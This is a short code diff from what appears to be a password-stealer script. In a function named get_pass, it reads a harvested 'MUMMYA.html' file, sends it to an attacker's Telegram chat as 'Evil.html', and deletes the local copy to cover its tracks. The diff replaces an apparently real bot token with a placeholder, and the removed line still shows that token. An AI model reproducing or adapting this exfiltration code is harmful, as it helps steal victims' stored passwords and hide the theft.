@@ -76,8 +76,8 @@ def get_pass():
     with open('MUMMYA.html', 'rb') as bit_html:
         content = bit_html.read()
 
-    tele_bot = '2031772166:AAFGv18Ms6BnWt8556qfJFDTxa0JwdciX7M'
-    user_id = 'Enter Your ID Telegram'
+    tele_bot = 'Enter Your Bot Telegram!'
+    user_id = 'Enter Your ID Telegram!'
     bot = Bot(token=tele_bot)
     bot.send_document(chat_id=user_id, document=content, filename='Evil.html')
     remove('MUMMYA.html')
